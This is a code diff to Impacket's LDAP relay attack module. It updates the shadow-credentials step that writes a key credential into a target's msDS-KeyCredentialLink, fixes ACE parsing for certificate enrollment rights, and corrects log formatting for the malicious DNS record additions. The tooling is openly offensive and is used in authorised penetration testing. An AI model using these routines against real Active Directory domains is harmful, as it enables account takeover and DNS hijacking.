@@ -1,6 +1,8 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2023 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -282,10 +284,10 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        certificate,publicKey,key = shadow_credentials.createX509Certificate(subject=currentShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget, nBefore=(-40 * 365), nAfter=(40 * 365))
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
-        keyCredential = shadow_credentials.CreateKeyCredentialFromX509Certificate(publicKey, deviceId=shadow_credentials.getRandomGUID(), owner=target_dn, currentTime=shadow_credentials.getTimeTicks())
+        keyCredential = shadow_credentials.KeyCredential(certificate,key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
         #LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
         #LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
         self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
@@ -298,7 +300,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('Could not query target user properties')
             return
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential, target_dn )]
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
             LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
@@ -677,10 +679,12 @@ class LDAPAttack(ProtocolAttack):
 
             for ace in (a for a in sd["Dacl"]["Data"] if a["AceType"] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
                 sid = format_sid(ace["Ace"]["Sid"].getData())
-                if ace["Ace"]["ObjectTypeLen"] == 0:
+                if ace["Ace"]["Flags"] == 2:
                     uuid = bin_to_string(ace["Ace"]["InheritedObjectType"]).lower()
-                else:
+                elif ace["Ace"]["Flags"] == 1:
                     uuid = bin_to_string(ace["Ace"]["ObjectType"]).lower()
+                else:
+                    continue
 
                 if not uuid in enrollment_uuids:
                     continue
@@ -711,7 +715,7 @@ class LDAPAttack(ProtocolAttack):
                     sid_map[sid] = sid
                     continue
 
-                if not len(self.client.response):
+                if not len(self.client.entries):
                     sid_map[sid] = sid
                 else:
                     sid_map[sid] = domain_fqdn + "\\" + self.client.response[0]["attributes"]["name"]
@@ -872,7 +876,7 @@ class LDAPAttack(ProtocolAttack):
 
         LOG.info('Adding `A` record `%s` pointing to `%s` at `%s`' % (a_record_name, ipaddr, a_record_dn))
         if not self.client.add(a_record_dn, ['top', 'dnsNode'], a_record_data):
-            LOG.error('Failed to add `A` record: ' % str(self.client.result))
+            LOG.error('Failed to add `A` record: %s' % str(self.client.result))
             return
 
         LOG.info('Added `A` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % a_record_name)
@@ -894,7 +898,7 @@ class LDAPAttack(ProtocolAttack):
 
         LOG.info('Adding `NS` record `%s` pointing to `%s` at `%s`' % (ns_record_name, ns_record_value, ns_record_dn))
         if not self.client.add(ns_record_dn, ['top', 'dnsNode'], ns_record_data):
-            LOG.error('Failed to add `NS` record `wpad`: ' % str(self.client.result))
+            LOG.error('Failed to add `NS` record `wpad`: %s' % str(self.client.result))
             return
 
         LOG.info('Added `NS` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % ns_record_name)
@@ -916,7 +920,7 @@ class LDAPAttack(ProtocolAttack):
 
         if self.config.interactive:
             if self.tcp_shell is not None:
-                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
+                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d as %s/%s' % (self.tcp_shell.port, self.domain, self.username))
                 # Start listening and launch interactive shell.
                 self.tcp_shell.listen()
                 ldap_shell = LdapShell(self.tcp_shell, domainDumper, self.client)
